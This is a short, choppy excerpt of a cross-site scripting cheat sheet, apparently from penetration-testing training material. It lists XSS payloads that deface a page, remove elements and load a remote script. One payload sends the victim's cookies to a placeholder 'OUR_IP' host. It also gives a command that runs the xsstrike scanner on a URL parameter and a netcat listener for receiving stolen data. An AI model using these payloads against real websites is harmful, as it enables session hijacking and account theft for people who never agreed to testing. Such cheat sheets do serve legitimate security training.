...
[0].innerHTML = 'text'</script>
Overwrite website's
main body
<script>document.getElementById('urlform').remove();
</script>
Remove certain
HTML element
CROSS-SITE SCRIPTING (XSS)
...
Load remote script
<script>new Image().src='http://OUR_IP/index.php?
c='+document.cookie</script>
Send Cookie details
to us
Commands
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?
task=test"
Run xsstrike on a
url parameter
sudo nc -lvnp 80
